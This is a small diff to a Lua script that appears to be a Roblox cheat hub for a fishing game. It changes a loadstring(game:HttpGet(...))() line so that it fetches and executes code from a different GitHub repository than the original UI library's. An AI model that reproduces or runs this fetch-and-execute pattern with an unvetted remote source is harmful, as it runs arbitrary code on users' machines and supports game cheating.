@@ -249,7 +249,7 @@ local tpNames={}; for n,_ in pairs(islandCoords) do table.insert(tpNames,n) end;
 ----------------------------------------------------------------
 -- ===================== VANIS UI ==============================
 ----------------------------------------------------------------
-local library = loadstring(game:HttpGet('https://raw.githubusercontent.com/IsaacDaDev/VanisUILIB/main/Vanis.lua'))()
+local library = loadstring(game:HttpGet('https://raw.githubusercontent.com/rendy45kz/vir/main/tesfish.lua'))()
 local Window  = library:CreateWindow("AegisHub • Fish It", "v2", 10044538000)
 
 -- Satu TAB saja → banyak FRAME (supaya semua menu muncul)
